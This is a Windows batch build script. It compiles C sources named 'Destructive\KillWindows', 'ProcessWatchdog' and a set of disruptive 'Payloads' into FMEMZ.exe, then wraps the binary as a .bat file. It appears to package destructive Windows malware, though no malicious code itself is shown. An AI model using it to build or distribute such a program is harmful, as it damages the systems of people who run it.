@echo off
md Build
D:\Python27\python.exe Data/genData.py Build/Data.c Build/Data.h
del Build\Mode.h
fsutil file createnew Build\Mode.h 0
rem i686-w64-mingw32-gcc
gcc -nostdlib -nodefaultlibs -std=c99 -Wl,-e_start -s -mwindows -m32 -municode -Os -w -march=i486 Source\Clean\Main.c Source\Destructive\KillWindows.c Source\Destructive\Main.c Source\Destructive\ProcessWatchdog.c Source\Payloads\PayloadCrazyBus.c Source\Payloads\PayloadCursor.c Source\Payloads\PayloadDrawErrors.c Source\Payloads\PayloadExecute.c Source\Payloads\PayloadInvert.c Source\Payloads\PayloadKeyboard.c Source\Payloads\PayloadMessageBox.c Source\Payloads\PayloadReverseText.c Source\Payloads\Payloads.c Source\Payloads\PayloadScreenGlitches.c Source\Payloads\PayloadSound.c Source\Payloads\PayloadTunnel.c Source\Utils\MsgBoxHook.c Source\Utils\Random.c Source\Utils\StrReverse.c Build\Data.c -luser32 -lkernel32 -lgdi32 -lwinmm -lcomctl32 -ladvapi32 -lshell32 -lpsapi -o FMEMZ.exe
python Source\exe2bat.py FMEMZ.exe FMEMZ.bat FMEMZ.exe -xp -zip